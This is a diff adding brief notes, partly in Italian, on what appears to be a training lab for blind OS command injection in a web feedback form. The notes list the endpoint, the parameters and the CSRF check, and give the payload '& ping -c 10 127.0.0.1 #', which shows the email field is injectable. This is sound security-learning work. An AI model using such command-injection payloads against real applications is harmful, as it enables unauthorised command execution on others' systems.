@@ -1,0 +1,32 @@
+Lab: Blind OS command injection with time delays
+
+This lab contains a blind OS command injection vulnerability in the feedback function.
+
+The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.
+
+To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.
+
+
+Pagina vulnerabile: /feedback/submit
+Metodo: POST
+Parametri inviati alla web app: csrf=QAldZPrqFDJ8RfY7sNrycJT359CE9ZSU&name=a&email=a%40a.a&subject=a&message=a
+Risposta:
+HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 2
+
+{}
+
+
+
+1) Verifica validità token csrf
+Se rimosso o modificato il serve restituisce i messaggi di errore:
+"Invalid CSRF token" o "Invalid CSRF token"
+
+2) Individuazione parametro vulnerabile
+Exploit = & ping -c 10 127.0.0.1 #
+Parametro name: non vulnerabile
+Parametro email: sì
+Parametro subject: non vulnerabile
+Parametro message: non vulnerabile
